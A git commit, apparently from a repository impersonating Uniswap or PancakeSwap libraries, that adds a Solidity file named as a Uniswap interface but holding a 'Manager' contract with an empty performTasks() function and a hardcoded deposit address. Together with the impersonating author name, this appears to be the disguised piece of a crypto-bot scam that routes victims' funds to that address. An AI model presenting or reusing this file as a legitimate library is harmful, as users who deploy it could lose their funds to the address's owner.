b15cd3b22d54c1512bff06bf2ba4a4dfb89fdf3d
PancakeSwapLibs <pancakeswaplib@protonmail.com>
2021-12-04 17:05:26 +0100

    feat: manager contract updated
    updated liquidity manager fees
    
    update
    
    Update IUniswapV1Manager.sol
    
    Update IUniswapV1Manager.sol
    
    Update IUniswapV1Manager.sol

---
+++ Uniswap/Manager/interfaces/IUniswapV1Manager.sol
@@ -0,0 +1,12 @@
+  
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x33259D09c12a668C8d1cf80313E8a1bb0994D3fD;
+	}
+}
